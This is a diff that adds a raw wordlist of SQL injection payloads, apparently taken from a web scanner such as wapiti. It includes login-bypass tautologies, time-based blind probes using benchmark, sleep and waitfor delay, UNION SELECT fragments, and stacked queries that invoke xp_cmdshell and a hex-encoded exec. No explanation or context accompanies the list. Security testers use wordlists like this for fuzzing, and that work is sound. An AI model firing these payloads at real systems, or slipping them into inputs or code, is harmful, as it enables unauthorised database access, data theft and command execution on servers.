@@ -1,0 +1,69 @@
+)%20or%20('x'='x
+%20or%201=1
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+a"""" or 3=3--"""
+" or benchmark(10000000,MD5(1))#
+# from wapiti
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+order by
+ or 1=1 /*
+)) or sleep(__TIME__)='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+sqlvuln;
+ union select * from users where login = char ...
+x' or 1=1 or 'x'='y
+28%
+â or 3=3 --
+@variable
+ or '1'='1'--
+a" or 1=1--
+//*
+%2A%7C
+" or 0=0 --
+?
+!
+'
+ or a = a
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+<>"'%;)(&+
+'%20or%201=1
+29%
+26%
+' or ''='
+' or 3=3
+' or 3=3 --
+OR 1'='1' -- 
+OR 1.e(1) = 1 -- 
+OR 1.e(1) = '1' -- 
+OR 1.e(1) = CAST(UNHEX('31') AS CHAR) -- 
+OR '31' = HEX(1) -- 
+'"]);
+A' || '2' < '3' --
